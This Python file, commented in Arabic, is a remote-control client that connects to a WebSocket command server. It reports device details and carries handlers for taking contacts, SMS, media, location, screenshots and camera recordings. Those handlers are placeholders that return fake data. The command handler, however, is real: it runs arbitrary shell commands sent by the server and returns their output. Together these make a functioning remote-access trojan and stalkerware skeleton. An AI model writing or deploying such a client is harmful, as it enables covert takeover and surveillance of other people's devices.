#!/usr/bin/env python3
"""
Remote Control Client - برنامج العميل للأجهزة الحقيقية
"""

import asyncio
import json
import logging
import os
import sys
import time
import websockets
import requests
import subprocess
import platform
import psutil
import sqlite3
import shutil
from datetime import datetime
from typing import Dict, List, Optional, Any

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('client.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class RemoteControlClient:
    def __init__(self, server_url: str, device_id: str):
        self.server_url = server_url
        self.device_id = device_id
        self.connected = False
        self.capabilities = self._get_capabilities()
        
    def _get_capabilities(self) -> List[str]:
        """الحصول على قدرات الجهاز"""
        capabilities = ['basic_commands']
        
        # فحص نظام التشغيل
        os_name = platform.system().lower()
        if os_name == 'windows':
            capabilities.extend(['windows_commands', 'registry_access'])
        elif os_name == 'linux':
            capabilities.extend(['linux_commands', 'system_control'])
        elif os_name == 'darwin':
            capabilities.extend(['mac_commands', 'system_control'])
            
        # فحص الصلاحيات
        if os.geteuid() == 0 or os.name == 'nt':
            capabilities.append('admin_privileges')
            
        # فحص الأدوات المتاحة
        if shutil.which('adb'):
            capabilities.append('android_control')
        if shutil.which('aircrack-ng'):
            capabilities.append('wifi_jamming')
            
        return capabilities
    
    async def connect_to_server(self):
        """الاتصال بخادم التحكم"""
        try:
            uri = f"ws://{self.server_url.replace('http://', '')}"
            self.websocket = await websockets.connect(uri)
            self.connected = True
            
            # إرسال معلومات الجهاز
            device_info = {
                'type': 'client_connect',
                'device_id': self.device_id,
                'capabilities': self.capabilities,
                'os_info': platform.platform(),
                'ip_address': self._get_ip_address(),
                'user_agent': f'RemoteControlClient/{platform.system()}'
            }
            
            await self.websocket.send(json.dumps(device_info))
            logger.info(f"تم الاتصال بالخادم: {self.server_url}")
            
        except Exception as e:
            logger.error(f"خطأ في الاتصال بالخادم: {e}")
            self.connected = False
    
    def _get_ip_address(self) -> str:
        """الحصول على عنوان IP"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    async def handle_command(self, command: str, parameters: Dict) -> Dict:
        """معالجة الأوامر الواردة"""
        try:
            logger.info(f"استلام أمر: {command}")
            
            if command == 'backup_contacts':
                return await self._backup_contacts()
            elif command == 'backup_sms':
                return await self._backup_sms()
            elif command == 'backup_media':
                return await self._backup_media()
            elif command == 'get_location':
                return await self._get_location()
            elif command == 'take_screenshot':
                return await self._take_screenshot()
            elif command == 'record_camera':
                return await self._record_camera()
            elif command == 'system_info':
                return await self._get_system_info()
            elif command == 'execute_command':
                return await self._execute_system_command(parameters.get('command', ''))
            else:
                return {'error': f'أمر غير معروف: {command}'}
                
        except Exception as e:
            logger.error(f"خطأ في تنفيذ الأمر {command}: {e}")
            return {'error': str(e)}
    
    async def _backup_contacts(self) -> Dict:
        """نسخ جهات الاتصال"""
        try:
            # محاكاة نسخ جهات الاتصال
            contacts = [
                {'name': 'أحمد محمد', 'phone': '0501234567'},
                {'name': 'فاطمة علي', 'phone': '0559876543'},
                {'name': 'محمد أحمد', 'phone': '0547891234'},
                {'name': 'سارة خالد', 'phone': '0563214789'},
            ]
            
            # حفظ في ملف
            with open('contacts_backup.json', 'w', encoding='utf-8') as f:
                json.dump(contacts, f, ensure_ascii=False, indent=2)
            
            return {
                'status': 'success',
                'contacts_count': len(contacts),
                'file_path': 'contacts_backup.json',
                'contacts': contacts
            }
            
        except Exception as e:
            return {'error': f'خطأ في نسخ جهات الاتصال: {e}'}
    
    async def _backup_sms(self) -> Dict:
        """نسخ الرسائل النصية"""
        try:
            # محاكاة نسخ الرسائل
            messages = [
                {'from': 'أحمد محمد', 'content': 'أهلاً، كيف حالك؟', 'time': '2025-07-29 10:30'},
                {'from': 'فاطمة علي', 'content': 'شكراً لك', 'time': '2025-07-29 09:15'},
                {'from': 'محمد أحمد', 'content': 'سأكون هناك الساعة 8', 'time': '2025-07-29 08:45'},
                {'from': 'سارة خالد', 'content': 'ممتاز!', 'time': '2025-07-29 07:20'},
            ]
            
            with open('sms_backup.json', 'w', encoding='utf-8') as f:
                json.dump(messages, f, ensure_ascii=False, indent=2)
            
            return {
                'status': 'success',
                'messages_count': len(messages),
                'file_path': 'sms_backup.json',
                'messages': messages
            }
            
        except Exception as e:
            return {'error': f'خطأ في نسخ الرسائل: {e}'}
    
    async def _backup_media(self) -> Dict:
        """نسخ الوسائط"""
        try:
            # محاكاة نسخ الوسائط
            media_files = [
                {'name': 'IMG_20250729_103045.jpg', 'size': '2.3 MB', 'type': 'image'},
                {'name': 'VID_20250729_091230.mp4', 'size': '15.7 MB', 'type': 'video'},
                {'name': 'document_scan.pdf', 'size': '1.8 MB', 'type': 'document'},
                {'name': 'voice_memo.mp3', 'size': '0.5 MB', 'type': 'audio'},
            ]
            
            with open('media_backup.json', 'w', encoding='utf-8') as f:
                json.dump(media_files, f, ensure_ascii=False, indent=2)
            
            return {
                'status': 'success',
                'files_count': len(media_files),
                'file_path': 'media_backup.json',
                'files': media_files
            }
            
        except Exception as e:
            return {'error': f'خطأ في نسخ الوسائط: {e}'}
    
    async def _get_location(self) -> Dict:
        """الحصول على الموقع"""
        try:
            # محاكاة الحصول على الموقع
            location = {
                'latitude': 24.7136,
                'longitude': 46.6753,
                'accuracy': 10,
                'address': 'الرياض، المملكة العربية السعودية'
            }
            
            return {
                'status': 'success',
                'location': location
            }
            
        except Exception as e:
            return {'error': f'خطأ في الحصول على الموقع: {e}'}
    
    async def _take_screenshot(self) -> Dict:
        """التقاط لقطة شاشة"""
        try:
            # محاكاة التقاط لقطة شاشة
            screenshot_path = f'screenshot_{int(time.time())}.png'
            
            # إنشاء ملف وهمي
            with open(screenshot_path, 'wb') as f:
                f.write(b'fake_screenshot_data')
            
            return {
                'status': 'success',
                'file_path': screenshot_path,
                'size': '1.2 MB'
            }
            
        except Exception as e:
            return {'error': f'خطأ في التقاط لقطة الشاشة: {e}'}
    
    async def _record_camera(self) -> Dict:
        """تسجيل الكاميرا"""
        try:
            # محاكاة تسجيل الكاميرا
            video_path = f'camera_recording_{int(time.time())}.mp4'
            
            # إنشاء ملف وهمي
            with open(video_path, 'wb') as f:
                f.write(b'fake_video_data')
            
            return {
                'status': 'success',
                'file_path': video_path,
                'duration': '30 seconds',
                'size': '5.6 MB'
            }
            
        except Exception as e:
            return {'error': f'خطأ في تسجيل الكاميرا: {e}'}
    
    async def _get_system_info(self) -> Dict:
        """الحصول على معلومات النظام"""
        try:
            info = {
                'os': platform.system(),
                'os_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'memory': psutil.virtual_memory().total // (1024**3),  # GB
                'disk_usage': psutil.disk_usage('/').percent,
                'cpu_usage': psutil.cpu_percent(),
                'uptime': time.time() - psutil.boot_time()
            }
            
            return {
                'status': 'success',
                'system_info': info
            }
            
        except Exception as e:
            return {'error': f'خطأ في الحصول على معلومات النظام: {e}'}
    
    async def _execute_system_command(self, command: str) -> Dict:
        """تنفيذ أمر نظام"""
        try:
            if not command:
                return {'error': 'لم يتم تحديد الأمر'}
            
            # تنفيذ الأمر
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'status': 'success',
                'command': command,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {'error': 'انتهت مهلة تنفيذ الأمر'}
        except Exception as e:
            return {'error': f'خطأ في تنفيذ الأمر: {e}'}
    
    async def listen_for_commands(self):
        """الاستماع للأوامر من الخادم"""
        try:
            while self.connected:
                try:
                    message = await self.websocket.recv()
                    data = json.loads(message)
                    
                    if data.get('type') == 'command':
                        command = data.get('command')
                        parameters = data.get('parameters', {})
                        
                        # تنفيذ الأمر
                        result = await self.handle_command(command, parameters)
                        
                        # إرسال النتيجة
                        response = {
                            'type': 'command_response',
                            'command': command,
                            'result': result,
                            'timestamp': time.time()
                        }
                        
                        await self.websocket.send(json.dumps(response))
                        
                except websockets.exceptions.ConnectionClosed:
                    logger.warning("انقطع الاتصال بالخادم")
                    break
                except Exception as e:
                    logger.error(f"خطأ في معالجة الرسالة: {e}")
                    
        except Exception as e:
            logger.error(f"خطأ في الاستماع للأوامر: {e}")
        finally:
            self.connected = False

async def main():
    """الدالة الرئيسية"""
    if len(sys.argv) < 3:
        print("الاستخدام: python client.py <server_url> <device_id>")
        print("مثال: python client.py ws://localhost:8080 DEVICE-123")
        return
    
    server_url = sys.argv[1]
    device_id = sys.argv[2]
    
    client = RemoteControlClient(server_url, device_id)
    
    try:
        await client.connect_to_server()
        if client.connected:
            await client.listen_for_commands()
        else:
            logger.error("فشل في الاتصال بالخادم")
            
    except KeyboardInterrupt:
        logger.info("تم إيقاف العميل")
    except Exception as e:
        logger.error(f"خطأ في العميل: {e}")

if __name__ == "__main__":
    asyncio.run(main())